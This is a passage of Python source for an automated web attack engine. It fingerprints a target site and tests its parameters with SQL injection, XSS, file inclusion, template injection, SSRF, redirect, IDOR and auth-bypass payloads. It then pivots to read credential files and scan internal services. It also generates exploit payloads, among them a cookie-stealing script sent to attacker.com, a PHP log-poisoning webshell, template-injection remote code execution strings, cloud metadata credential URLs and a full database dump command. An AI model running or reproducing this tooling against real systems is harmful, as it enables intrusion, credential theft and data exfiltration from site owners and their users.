                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name: params_set.add(name)
            for a in soup.find_all('a', href=True):
                href = a.get('href', '')
                if '?' in href:
                    for param in href.split('?')[1].split('&'):
                        if '=' in param:
                            params_set.add(param.split('=')[0])
            
            self.observations['parameters'] = list(params_set)
            
            # Detect tech stack signatures
            content = (response.text or '').lower()
            techs = []
            tech_signatures = {
                'PHP': ['.php', 'x-powered-by: php'],
                'ASP.NET': ['.aspx', '__viewstate', 'x-aspnet-version'],
                'Java': ['.jsp', 'jsessionid', 'javax.faces'],
                'Node.js': ['express', 'node.js', 'x-powered-by: express'],
                'Python': ['wsgi', 'django', 'flask', 'python'],
                'NGINX': ['nginx', 'server: nginx'],
                'Apache': ['apache', 'server: apache'],
                'IIS': ['iis', 'microsoft-iis'],
                'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
                'Drupal': ['drupal.js', 'sites/all'],
                'Joomla': ['joomla', 'option=com_'],
                'React': ['react', 'react-dom'],
                'Angular': ['ng-version', 'angular.js'],
                'Vue': ['vue.js', 'vuejs'],
                'jQuery': ['jquery', '$('],
                'Bootstrap': ['bootstrap', 'bootstrapcdn']
            }
            for tech, sigs in tech_signatures.items():
                if any(sig in content or sig in str(response.headers).lower() for sig in sigs):
                    techs.append(tech)
            self.observations['technologies'] = techs
            
            # Store in global tech stack
            for tech in techs:
                if tech not in str(scan_state['tech_stack']):
                    category = 'CMS' if tech in ['WordPress', 'Drupal', 'Joomla'] else \
                               'Frontend' if tech in ['React', 'Angular', 'Vue', 'jQuery', 'Bootstrap'] else \
                               'Server' if tech in ['NGINX', 'Apache', 'IIS'] else \
                               'Backend'
                    if category not in scan_state['tech_stack']:
                        scan_state['tech_stack'][category] = []
                    if tech not in scan_state['tech_stack'][category]:
                        scan_state['tech_stack'][category].append(tech)
            
            log('green', f'[MYTHOS-ENGINE] [OBSERVE] Complete. Found: {len(params_set)} params, {len(techs)} technologies, {self.observations["forms"]} forms.')
            
        except Exception as e:
            raise NetworkError(f"Observation failed: {str(e)}")
        
        return self.observations
    
    @self_healing(max_retries=2)
    def hypothesize(self):
        """Phase 2: Generate attack hypotheses based on observations"""
        log('purple', f'[MYTHOS-ENGINE] [HYPOTHESIZE] Generating attack hypotheses...')
        self.hypotheses = []
        
        obs = self.observations
        params = obs.get('parameters', [])
        techs = obs.get('technologies', [])
        forms = obs.get('forms', 0)
        
        # Hypothesis 1: SQL Injection
        if params or forms:
            self.hypotheses.append({
                'id': 'H1',
                'type': 'SQL_INJECTION',
                'confidence': 0.65,
                'rationale': f'Found {len(params)} parameters and {forms} forms. Testing for SQLi.',
                'test_params': params if params else ['id', 'search', 'query'],
                'priority': 'HIGH',
                'payloads': [
                    "'", '"', "')", '")', "';", '";',
                    "' OR '1'='1", '" OR "1"="1',
                    "' AND 1=1--", "' AND 1=0--",
                    "' UNION SELECT NULL--",
                    "' AND SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--"
                ]
            })
        
        # Hypothesis 2: XSS
        if params or forms:
            self.hypotheses.append({
                'id': 'H2',
                'type': 'XSS',
                'confidence': 0.60,
                'rationale': f'{len(params)} parameters are injection points for XSS.',
                'test_params': params if params else ['q', 'search', 'name', 's'],
                'priority': 'HIGH',
                'payloads': [
                    '<script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '\"><svg onload=alert(1)>',
                    'javascript:alert(1)//',
                    '"><img src=x onerror=prompt(1)>'
                ]
            })
        
        # Hypothesis 3: Path Traversal / LFI
        if params:
            file_params = [p for p in params if any(x in p.lower() for x in ['file', 'path', 'page', 'doc', 'inc', 'view'])]
            if file_params:
                self.hypotheses.append({
                    'id': 'H3',
                    'type': 'LFI',
                    'confidence': 0.75,
                    'rationale': f'Parameters suggestive of file inclusion: {file_params}',
                    'test_params': file_params,
                    'priority': 'HIGH',
                    'payloads': [
                        '../../../../etc/passwd',
                        '../../../../windows/win.ini',
                        'php://filter/convert.base64-encode/resource=index.php',
                        '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
                    ]
                })
        
        # Hypothesis 4: Server-Side Template Injection
        if params:
            template_params = [p for p in params if any(x in p.lower() for x in ['name', 'template', 'view', 'tpl'])]
            if template_params:
                self.hypotheses.append({
                    'id': 'H4',
                    'type': 'SSTI',
                    'confidence': 0.50,
                    'rationale': f'Parameters {template_params} may be rendered through template engine.',
                    'test_params': template_params,
                    'priority': 'MEDIUM',
                    'payloads': [
                        '{{7*7}}', '${7*7}', '<%=7*7%>', '#{7*7}', '{7*7}'
                    ]
                })
        
        # Hypothesis 5: SSRF
        if params:
            url_params = [p for p in params if any(x in p.lower() for x in ['url', 'uri', 'redirect', 'src', 'href', 'source'])]
            if url_params:
                self.hypotheses.append({
                    'id': 'H5',
                    'type': 'SSRF',
                    'confidence': 0.70,
                    'rationale': f'Parameters suggest URL fetching: {url_params}',
                    'test_params': url_params,
                    'priority': 'CRITICAL',
                    'payloads': [
                        'http://127.0.0.1:22',
                        'http://127.0.0.1:80',
                        'http://169.254.169.254/latest/meta-data/',
                        'file:///etc/passwd',
                        'http://localhost:8080'
                    ]
                })
        
        # Hypothesis 6: Open Redirect
        if params:
            redirect_params = [p for p in params if any(x in p.lower() for x in ['redirect', 'next', 'return', 'goto', 'dest', 'target'])]
            if redirect_params:
                self.hypotheses.append({
                    'id': 'H6',
                    'type': 'OPEN_REDIRECT',
                    'confidence': 0.55,
                    'rationale': f'Redirect parameters found: {redirect_params}',
                    'test_params': redirect_params,
                    'priority': 'MEDIUM',
                    'payloads': [
                        'http://evil.com',
                        '//evil.com',
                        'https://evil.com/',
                        '///evil.com'
                    ]
                })
        
        # Hypothesis 7: IDOR
        if params:
            id_params = [p for p in params if any(x in p.lower() for x in ['id', 'uid', 'user', 'account', 'order', 'num'])]
            if id_params:
                self.hypotheses.append({
                    'id': 'H7',
                    'type': 'IDOR',
                    'confidence': 0.60,
                    'rationale': f'Numeric/sequential parameters: {id_params}',
                    'test_params': id_params,
                    'priority': 'HIGH',
                    'payloads': ['1', '2', '100', 'admin', '0']
                })
        
        # Hypothesis 8: Auth Bypass
        auth_paths = ['/admin', '/login', '/wp-admin', '/api/admin', '/dashboard']
        self.hypotheses.append({
            'id': 'H8',
            'type': 'AUTH_BYPASS',
            'confidence': 0.40,
            'rationale': f'Testing standard authentication bypass techniques.',
            'test_params': auth_paths,
            'priority': 'HIGH',
            'payloads': [
                {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
                {'header': 'X-Original-URL', 'value': '/admin'},
                {'header': 'X-Rewrite-URL', 'value': '/admin'},
                {'cookie': 'admin=true'},
                {'cookie': 'role=admin'}
            ]
        })
        
        log('green', f'[MYTHOS-ENGINE] [HYPOTHESIZE] Generated {len(self.hypotheses)} hypotheses.')
        for h in self.hypotheses:
            log('yellow', f'  [{h["id"]}] {h["type"]} - {h["rationale"][:80]}... (confidence: {h["confidence"]}, priority: {h["priority"]})')
        
        return self.hypotheses
    
    @self_healing(max_retries=2)
    def test_hypothesis(self, hypothesis):
        """Phase 3: Test a single hypothesis thoroughly"""
        h_id = hypothesis['id']
        h_type = hypothesis['type']
        log('purple', f'[MYTHOS-ENGINE] [TEST] Executing {h_id}: {h_type}...')
        
        findings = []
        params = get_scan_params()
        
        try:
            if h_type == 'SQL_INJECTION':
                findings = self._test_sqli(hypothesis)
            elif h_type == 'XSS':
                findings = self._test_xss(hypothesis)
            elif h_type == 'LFI':
                findings = self._test_lfi(hypothesis)
            elif h_type == 'SSTI':
                findings = self._test_ssti(hypothesis)
            elif h_type == 'SSRF':
                findings = self._test_ssrf(hypothesis)
            elif h_type == 'OPEN_REDIRECT':
                findings = self._test_redirect(hypothesis)
            elif h_type == 'IDOR':
                findings = self._test_idor(hypothesis)
            elif h_type == 'AUTH_BYPASS':
                findings = self._test_auth_bypass(hypothesis)
            else:
                log('yellow', f'[MYTHOS-ENGINE] Unknown hypothesis type: {h_type}')
        except Exception as e:
            raise ScanError(f"Hypothesis test {h_id} failed: {str(e)}")
        
        return findings
    
    def _test_sqli(self, hypothesis):
        """Test SQL injection hypothesis with error-based, boolean, and time-based"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        error_signatures = [
            'sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite',
            'unclosed quotation', 'odbc', 'sqlstate', 'microsoft ole db',
            'warning: mysql_', 'supplied argument is not a valid mysql',
            'you have an error in your sql', 'division by zero',
            'unknown column', 'from information_schema'
        ]
        
        for param in params:
            if not self.running: break
            log('cyan', f'[MYTHOS-SQLI] Testing param "{param}"...')
            
            # Error-based
            for payload in ["'", '"', "')", '")', "';"]:
                if not self.running: break
                try:
                    res = self.session.get(
                        base_url, params={param: payload},
                        timeout=get_scan_params()['timeout']
                    )
                    for sig in error_signatures:
                        if sig in (res.text or '').lower():
                            findings.append({
                                'type': 'SQL_INJECTION',
                                'param': param,
                                'payload': payload,
                                'evidence': sig,
                                'method': 'error-based',
                                'severity': 'HIGH',
                                'confirmed': True
                            })
                            log('red', f'[MYTHOS-SQLI] CONFIRMED: ?{param}={payload} (evidence: {sig})')
                            break
                    random_delay(0.1, 0.3)
                except:
                    continue
            
            if not self.running: break
            
            # Boolean-based blind
            try:
                # Compare true vs false responses
                res_true = self.session.get(
                    base_url, params={param: "' AND '1'='1"},
                    timeout=get_scan_params()['timeout']
                )
                res_false = self.session.get(
                    base_url, params={param: "' AND '1'='2"},
                    timeout=get_scan_params()['timeout']
                )
                if res_true.status_code == 200 and res_false.status_code == 200:
                    len_diff = abs(len(res_true.text or '') - len(res_false.text or ''))
                    if len_diff > 50:
                        findings.append({
                            'type': 'SQL_INJECTION',
                            'param': param,
                            'payload': "' AND '1'='1 vs '1'='2",
                            'evidence': f'Response length difference: {len_diff}',
                            'method': 'boolean-blind',
                            'severity': 'MEDIUM',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-SQLI] Boolean-blind candidate: {param} (diff: {len_diff})')
            except:
                pass
            
            random_delay(0.2, 0.4)
            
            if not self.running: break
            
            # Time-based blind (MySQL SLEEP)
            try:
                start = time.time()
                self.session.get(
                    base_url, params={param: "' AND SLEEP(4)--"},
                    timeout=max(get_scan_params()['timeout'], 8)
                )
                elapsed = time.time() - start
                if elapsed > 3.5:
                    findings.append({
                        'type': 'SQL_INJECTION',
                        'param': param,
                        'payload': "' AND SLEEP(4)--",
                        'evidence': f'Response delayed {elapsed:.1f}s',
                        'method': 'time-based',
                        'severity': 'HIGH',
                        'confirmed': True
                    })
                    log('red', f'[MYTHOS-SQLI] Time-based CONFIRMED: ?{param}=SLEEP (delay: {elapsed:.1f}s)')
            except:
                pass
            
            random_delay(0.3, 0.5)
        
        return findings
    
    def _test_xss(self, hypothesis):
        """Test XSS hypothesis with reflected and DOM-based detection"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        test_payloads = hypothesis.get('payloads', [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '\"><svg onload=alert(1)>'
        ])
        
        for param in params:
            if not self.running: break
            log('cyan', f'[MYTHOS-XSS] Testing param "{param}"...')
            
            for payload in test_payloads:
                if not self.running: break
                try:
                    # URL encode based on payload style
                    style = get_scan_params()['payload_style']
                    if style == 'url_encoded':
                        test_payload = quote(payload)
                    elif style == 'double_encoded':
                        test_payload = quote(quote(payload))
                    elif style == 'unicode':
                        test_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
                    elif style == 'mixed_case':
                        test_payload = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
                    else:
                        test_payload = payload
                    
                    res = self.session.get(
                        base_url, params={param: test_payload},
                        timeout=get_scan_params()['timeout']
                    )
                    
                    # Check if payload is reflected in response
                    if payload in (res.text or ''):
                        findings.append({
                            'type': 'XSS',
                            'param': param,
                            'payload': payload,
                            'evidence': 'Payload reflected in response',
                            'method': 'reflected',
                            'severity': 'HIGH',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-XSS] CONFIRMED: ?{param}={payload[:50]}')
                        break
                    
                    # Check for DOM sinks even if payload not reflected
                    dom_sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval(']
                    for sink in dom_sinks:
                        if sink in (res.text or '').lower():
                            findings.append({
                                'type': 'XSS',
                                'param': param,
                                'payload': payload,
                                'evidence': f'DOM sink found: {sink}',
                                'method': 'dom-based',
                                'severity': 'MEDIUM',
                                'confirmed': False
                            })
                    
                    random_delay(0.1, 0.2)
                except:
                    continue
        
        return findings
    
    def _test_lfi(self, hypothesis):
        """Test LFI hypothesis"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        lfi_payloads = hypothesis.get('payloads', [
            '../../../../etc/passwd',
            '../../../../windows/win.ini',
            'php://filter/convert.base64-encode/resource=index.php',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ])
        
        for param in params:
            if not self.running: break
            for payload in lfi_payloads:
                if not self.running: break
                try:
                    res = self.session.get(
                        base_url, params={param: payload},
                        timeout=get_scan_params()['timeout']
                    )
                    content = res.text or ''
                    
                    # Linux passwd
                    if 'root:x:0:0:' in content:
                        findings.append({
                            'type': 'LFI',
                            'param': param,
                            'payload': payload,
                            'evidence': '/etc/passwd contents leaked',
                            'method': 'path-traversal',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-LFI] CRITICAL: /etc/passwd leaked via ?{param}={payload}')
                        break
                    
                    # Windows win.ini
                    if '[fonts]' in content or '[extensions]' in content:
                        findings.append({
                            'type': 'LFI',
                            'param': param,
                            'payload': payload,
                            'evidence': 'win.ini contents leaked',
                            'method': 'path-traversal',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-LFI] CRITICAL: win.ini leaked via ?{param}={payload}')
                        break
                    
                    # PHP filter wrapper (base64 encoded content)
                    if 'php://filter' in payload and len(content) > 50:
                        try:
                            import base64 as b64
                            # Strip HTML if any
                            cleaned = content.strip()
                            if cleaned.startswith('<?php'):
                                findings.append({
                                    'type': 'LFI',
                                    'param': param,
                                    'payload': payload,
                                    'evidence': 'PHP source code leaked via filter wrapper',
                                    'method': 'php-wrapper',
                                    'severity': 'CRITICAL',
                                    'confirmed': True
                                })
                                log('red', f'[MYTHOS-LFI] CRITICAL: PHP source leaked via ?{param}={payload}')
                                break
                        except:
                            pass
                    
                    random_delay(0.15, 0.3)
                except:
                    continue
        
        return findings
    
    def _test_ssti(self, hypothesis):
        """Test SSTI hypothesis"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        ssti_tests = [
            ('{{7*7}}', 'Jinja2/Twig/Nunjucks', '49'),
            ('${7*7}', 'FreeMarker/Mako/Java', '49'),
            ('<%=7*7%>', 'ERB/JSP', '49'),
            ('#{7*7}', 'Pug/Jade', '49'),
            ('{7*7}', 'Smarty', '49'),
            ('*{7*7}', 'Velocity', '49')
        ]
        
        for param in params:
            if not self.running: break
            for payload, engine, expected in ssti_tests:
                if not self.running: break
                try:
                    res = self.session.get(
                        base_url, params={param: payload},
                        timeout=get_scan_params()['timeout']
                    )
                    if expected in (res.text or ''):
                        findings.append({
                            'type': 'SSTI',
                            'param': param,
                            'payload': payload,
                            'evidence': f'Math result "{expected}" reflected (engine: {engine})',
                            'method': 'math-test',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-SSTI] CRITICAL: {engine} SSTI via ?{param}={payload}')
                        break
                    random_delay(0.15, 0.3)
                except:
                    continue
        
        return findings
    
    def _test_ssrf(self, hypothesis):
        """Test SSRF hypothesis"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        for param in params:
            if not self.running: break
            for payload in hypothesis.get('payloads', []):
                if not self.running: break
                try:
                    start = time.time()
                    res = self.session.get(
                        base_url, params={param: payload},
                        timeout=get_scan_params()['timeout'],
                        allow_redirects=False
                    )
                    elapsed = time.time() - start
                    
                    content = res.text or ''
                    
                    # Cloud metadata indicators
                    if any(x in content for x in ['ami-id', 'instance-id', 'security-credentials', 'iam/', 'public-keys/']):
                        findings.append({
                            'type': 'SSRF',
                            'param': param,
                            'payload': payload,
                            'evidence': 'AWS IMDS metadata returned',
                            'method': 'cloud-metadata',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-SSRSF] CRITICAL: AWS metadata via ?{param}={payload}')
                        break
                    
                    if any(x in content for x in ['serviceAccounts', 'computeMetadata', 'project/']):
                        findings.append({
                            'type': 'SSRF',
                            'param': param,
                            'payload': payload,
                            'evidence': 'GCP metadata returned',
                            'method': 'cloud-metadata',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-SSRF] CRITICAL: GCP metadata via ?{param}={payload}')
                        break
                    
                    random_delay(0.2, 0.4)
                except:
                    continue
        
        return findings
    
    def _test_redirect(self, hypothesis):
        """Test open redirect hypothesis"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        for param in params:
            if not self.running: break
            for payload in hypothesis.get('payloads', []):
                if not self.running: break
                try:
                    res = self.session.get(
                        base_url, params={param: payload},
                        timeout=get_scan_params()['timeout'],
                        allow_redirects=False
                    )
                    location = res.headers.get('Location', '')
                    if payload in location or payload.rstrip('/') in location:
                        findings.append({
                            'type': 'OPEN_REDIRECT',
                            'param': param,
                            'payload': payload,
                            'evidence': f'Redirects to: {location}',
                            'method': 'header-check',
                            'severity': 'MEDIUM',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-REDIRECT] Confirmed: ?{param}={payload} → {location}')
                        break
                    random_delay(0.1, 0.2)
                except:
                    continue
        
        return findings
    
    def _test_idor(self, hypothesis):
        """Test IDOR hypothesis"""
        findings = []
        params = hypothesis['test_params']
        base_url = self.base_url
        
        for param in params:
            if not self.running: break
            responses = {}
            for val in ['1', '2', '100', '0', 'admin']:
                if not self.running: break
                try:
                    res = self.session.get(
                        base_url, params={param: val},
                        timeout=get_scan_params()['timeout']
                    )
                    responses[val] = (res.status_code, len(res.text or ''), res.text[:200])
                    random_delay(0.1, 0.2)
                except:
                    continue
            
            # Check for different responses (potential IDOR)
            if len(responses) >= 2:
                unique_lengths = set(r[1] for r in responses.values())
                if len(unique_lengths) > 2:
                    findings.append({
                        'type': 'IDOR',
                        'param': param,
                        'payload': str(responses),
                        'evidence': f'Different responses for different values: {unique_lengths}',
                        'method': 'response-analysis',
                        'severity': 'HIGH',
                        'confirmed': False
                    })
                    log('yellow', f'[MYTHOS-IDOR] Candidate: {param} returns different responses per value')
        
        return findings
    
    def _test_auth_bypass(self, hypothesis):
        """Test auth bypass hypothesis"""
        findings = []
        paths = hypothesis['test_params']
        base_url = self.base_url
        
        # Test header-based bypass
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Real-IP': '127.0.0.1'}
        ]
        
        for path in paths:
            if not self.running: break
            target_url = urljoin(f'{base_url}/', path.lstrip('/'))
            
            for headers in bypass_headers:
                if not self.running: break
                try:
                    res = self.session.get(
                        target_url, headers=headers,
                        timeout=get_scan_params()['timeout']
                    )
                    if res.status_code in [200, 302] and 'login' not in (res.text or '').lower()[:500]:
                        findings.append({
                            'type': 'AUTH_BYPASS',
                            'param': path,
                            'payload': str(headers),
                            'evidence': f'HTTP {res.status_code} with bypass header',
                            'method': 'header-bypass',
                            'severity': 'CRITICAL',
                            'confirmed': True
                        })
                        log('red', f'[MYTHOS-AUTH] CRITICAL: {path} accessible with {headers}')
                        break
                    random_delay(0.1, 0.3)
                except:
                    continue
        
        return findings
    
    def analyze_results(self, all_findings):
        """Phase 4: Analyze all test results, confirm/refute hypotheses"""
        log('purple', f'[MYTHOS-ENGINE] [ANALYZE] Analyzing test results...')
        
        confirmed = []
        refuted = []
        uncertain = []
        
        for finding in all_findings:
            if finding.get('confirmed'):
                confirmed.append(finding)
            elif finding.get('confidence', 0) > 0.5:
                uncertain.append(finding)
            else:
                refuted.append(finding)
        
        self.confirmed = confirmed
        
        log('green', f'[MYTHOS-ENGINE] [ANALYZE] Confirmed: {len(confirmed)}, Uncertain: {len(uncertain)}, Refuted: {len(refuted)}')
        
        for c in confirmed:
            log('red', f'  ✅ CONFIRMED: [{c["type"]}] {c.get("evidence", "")[:100]}')
        
        return confirmed, uncertain, refuted
    
    def chain_attacks(self, confirmed):
        """Phase 5: Chain confirmed findings into multi-step attack vectors"""
        log('purple', f'[MYTHOS-ENGINE] [CHAIN] Building attack chains from {len(confirmed)} findings...')
        
        chains = []
        
        types_found = set(f['type'] for f in confirmed)
        
        # Chain: SSRF + LFI = Cloud credential theft
        if 'SSRF' in types_found and 'LFI' in types_found:
            chain = {
                'name': 'Cloud Credential Theft via SSRF+LFI',
                'steps': [
                    '1. Exploit SSRF to access cloud metadata endpoints',
                    '2. Use LFI to read leaked temporary credentials',
                    '3. Use cloud CLI tools to enumerate resources',
                    '4. Exfiltrate sensitive data from cloud storage'
                ],
                'severity': 'CRITICAL',
                'exploitable': True,
                'mitigation': 'Restrict outbound HTTP, block metadata IP ranges'
            }
            chains.append(chain)
            log('red', f'[MYTHOS-CHAIN] ⛓️ CRITICAL CHAIN: {chain["name"]}')
        
        # Chain: SQLi + LFI = Database credential extraction
        if 'SQL_INJECTION' in types_found and 'LFI' in types_found:
            chain = {
                'name': 'Database Credential Extraction via SQLi+LFI',
                'steps': [
                    '1. Use LFI to read config files (config.php, .env)',
                    '2. Extract database credentials from config files',
                    '3. Use SQLi to dump all database contents',
                    '4. Escalate to OS command execution via xp_cmdshell or INTO OUTFILE'
                ],
                'severity': 'CRITICAL',
                'exploitable': True,
                'mitigation': 'Parameterized queries, restrict file read permissions'
            }
            chains.append(chain)
            log('red', f'[MYTHOS-CHAIN] ⛓️ CRITICAL CHAIN: {chain["name"]}')
        
        # Chain: XSS + AUTH_BYPASS = Session hijacking
        if 'XSS' in types_found and 'AUTH_BYPASS' in types_found:
            chain = {
                'name': 'Admin Session Hijacking via XSS+Bypass',
                'steps': [
                    '1. Use XSS to steal authenticated user cookies',
                    '2. Use auth bypass to access admin endpoints',
                    '3. Escalate privileges using stolen session + bypass',
                    '4. Create persistent backdoor user account'
                ],
                'severity': 'CRITICAL',
                'exploitable': True,
                'mitigation': 'HttpOnly/Secure/SameSite cookies, CSRF tokens'
            }
            chains.append(chain)
            log('red', f'[MYTHOS-CHAIN] ⛓️ CRITICAL CHAIN: {chain["name"]}')
        
        # Chain: SSTI + LFI = RCE
        if 'SSTI' in types_found:
            chain = {
                'name': 'Remote Code Execution via SSTI',
                'steps': [
                    '1. Confirm SSTI with math test payload',
                    '2. Read framework config to find SECRET_KEY',
                    '3. Use framework-specific RCE payload',
                    '4. Establish reverse shell or write webshell'
                ],
                'severity': 'CRITICAL',
                'exploitable': True,
                'mitigation': 'Disable template auto-escaping, sandbox template engines'
            }
            chains.append(chain)
            log('red', f'[MYTHOS-CHAIN] ⛓️ CRITICAL CHAIN: {chain["name"]}')
        
        # Chain: SSRF alone = Internal network pivot
        if 'SSRF' in types_found and len([f for f in confirmed if f['type'] == 'SSRF']) >= 1:
            chain = {
                'name': 'Internal Network Pivot via SSRF',
                'steps': [
                    '1. Use SSRF to probe internal IP ranges (10.x, 172.16.x, 192.168.x)',
                    '2. Scan for internal services (Redis, MySQL, internal APIs)',
                    '3. Exploit internal services with default credentials',
                    '4. Use internal service access as pivot to production data'
                ],
                'severity': 'HIGH',
                'exploitable': True,
                'mitigation': 'Network segmentation, metadata service blocking'
            }
            chains.append(chain)
            log('red', f'[MYTHOS-CHAIN] ⛓️ CHAIN: {chain["name"]}')
        
        self.attack_chains = chains
        
        for chain in chains:
            add_finding(
                chain['severity'].lower(),
                f'ATTACK CHAIN: {chain["name"]}',
                asset=f'CHAIN: {chain["name"]}',
                tool='mythos-engine'
            )
        
        return chains
    
    def generate_exploit_payload(self, finding):
        """Generate a working exploit payload for a confirmed finding"""
        ftype = finding['type']
        param = finding.get('param', '')
        
        if ftype == 'SQL_INJECTION':
            return {
                'type': 'sqlmap',
                'command': f'sqlmap -u "{self.base_url}?{param}=1" --batch --risk=3 --level=5 --dump-all',
                'manual_payload': f"SELECT * FROM information_schema.tables WHERE table_schema NOT IN ('mysql', 'information_schema')",
                'test_url': f"{self.base_url}?{param}=1'+UNION+SELECT+1,2,3,4,5--+-"
            }
        elif ftype == 'XSS':
            return {
                'type': 'beef',
                'hook_url': f"{self.base_url}?{param}=<script+src=//attacker.com/hook.js></script>",
                'manual_payload': "document.location='//attacker.com/steal?c='+document.cookie",
                'test_url': f"{self.base_url}?{param}=<img+src=x+onerror=alert(document.cookie)>"
            }
        elif ftype == 'LFI':
            return {
                'type': 'php-wrapper',
                'test_url': f"{self.base_url}?{param}=php://filter/convert.base64-encode/resource=config.php",
                'log_poisoning': f"{self.base_url}?{param}=../../../../var/log/apache2/access.log&cmd=<?php+system($_GET['cmd']);?>",
                'manual_command': f"curl '{self.base_url}?{param}=../../../../etc/passwd'"
            }
        elif ftype == 'SSRF':
            return {
                'type': 'cloud-metadata',
                'aws_url': f"{self.base_url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                'gcp_url': f"{self.base_url}?{param}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                'port_scan': f"{self.base_url}?{param}=http://10.0.0.1:22"
            }
        elif ftype == 'SSTI':
            return {
                'type': 'rce-payload',
                'jinja2_rce': f"{self.base_url}?{param}={{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}",
                'freemarker_rce': f"{self.base_url}?{param}=${{'freemarker.template.utility.Execute'?new()('id')}}",
                'erb_rce': f"{self.base_url}?{param}=<%=+system('id')+%>"
            }
        else:
            return {'type': 'generic', 'message': 'Manual exploitation required'}
    
    def pivot(self, confirmed):
        """Phase 6: Use confirmed access to reach deeper targets"""
        log('purple', f'[MYTHOS-ENGINE] [PIVOT] Attempting to pivot using confirmed findings...')
        
        pivot_findings = []
        
        for finding in confirmed:
            if finding['type'] == 'LFI':
                # Try to read config files for credentials
                config_paths = [
                    '../../../../var/www/html/config.php',
                    '../../../../var/www/html/.env',
                    '../../../../app/config/database.php',
                    '../../../../wp-config.php',
                    '../../../config.php'
                ]
                
                param = finding.get('param', 'file')
                for path in config_paths:
                    if not self.running: break
                    try:
                        res = self.session.get(
                            self.base_url, params={param: path},
                            timeout=get_scan_params()['timeout']
                        )
                        content = res.text or ''
                        secrets_found = extract_secret_leaks(content)
                        if secrets_found:
                            pivot_findings.append({
                                'type': 'PIVOT_CREDENTIAL_LEAK',
                                'source': f'LFI via ?{param}',
                                'file': path,
                                'secrets': secrets_found,
                                'severity': 'CRITICAL'
                            })
                            log('red', f'[MYTHOS-PIVOT] CREDENTIALS FOUND via LFI: {path} → {secrets_found}')
                            for secret in secrets_found:
                                add_finding('crit', f'PIVOT: {secret} leaked from {path} via LFI', asset=f'PIVOT_CRED_{secret}', tool='mythos-pivot')
                    except:
                        continue
                    random_delay(0.3, 0.5)
            
            elif finding['type'] == 'SSRF':
                # Try internal port scanning via SSRF
                internal_targets = [
                    ('http://127.0.0.1:22', 'SSH'),
                    ('http://127.0.0.1:3306', 'MySQL'),
                    ('http://127.0.0.1:6379', 'Redis'),
                    ('http://127.0.0.1:27017', 'MongoDB'),
                    ('http://10.0.0.1:22', 'Internal SSH'),
                    ('http://192.168.1.1:80', 'Internal HTTP')
                ]
                
                param = finding.get('param', 'url')
                for url, desc in internal_targets:
                    if not self.running: break
                    try:
                        res = self.session.get(
                            self.base_url, params={param: url},
                            timeout=5
                        )
                        if res.status_code != 500 and len(res.text or '') > 50:
                            pivot_findings.append({
                                'type': 'PIVOT_INTERNAL_ACCESS',
                                'source': f'SSRF via ?{param}',
                                'internal_url': url,
                                'service': desc,
                                'status_code': res.status_code,
                                'severity': 'HIGH'
                            })
                            log('red', f'[MYTHOS-PIVOT] Internal service reachable: {desc} at {url}')
                    except:
                        continue
                    random_delay(0.3, 0.5)
        
        self.pivot_targets = pivot_findings
        return pivot_findings
    
    def run_autonomous_scan(self):
        """Run the full autonomous scan pipeline"""
        log('cyan', '='*60)
        log('cyan', '  CLAUD MYTHOS-INSPIRED AUTONOMOUS SCAN ENGINE')
        log('cyan', f'  Target: {self.target}')
        log('cyan', '='*60)
        
        # Phase 1: Observe
        obs = self.observe()
        if not obs:
            log('red', '[MYTHOS-ENGINE] Observation failed. Aborting.')
            return None
        
        # Phase 2: Hypothesize
        hypotheses = self.hypothesize()
        
        # Phase 3: Test all hypotheses
        all_findings = []
        for hypothesis in hypotheses:
            if not self.running: break
            findings = self.test_hypothesis(hypothesis)
            all_findings.extend(findings)
            
            # Log findings to global state
            for f in findings:
                sev = f.get('severity', 'MEDIUM').lower()
                if f.get('confirmed'):
                    add_finding(
                        'crit' if sev == 'critical' else 'high' if sev == 'high' else 'med',
                        f'[MYTHOS] {f["type"]}: {f.get("evidence", "")[:200]}',
                        asset=f"{f['type']}_{f.get('param', 'unknown')}",
                        tool='mythos-engine'
                    )
        
        # Phase 4: Analyze
        confirmed, uncertain, refuted = self.analyze_results(all_findings)
        
        # Phase 5: Chain
        chains = self.chain_attacks(confirmed)
        
        # Phase 6: Pivot
        pivots = self.pivot(confirmed)
        
        # Phase 7: Generate exploit payloads for confirmed findings
        exploit_plans = []
        for finding in confirmed[:3]:  # Top 3 confirmed findings
            exploit = self.generate_exploit_payload(finding)
            exploit_plans.append({
                'finding': finding,
                'exploit': exploit
            })
        
        # Compile final report
        report = {
            'target': self.target,
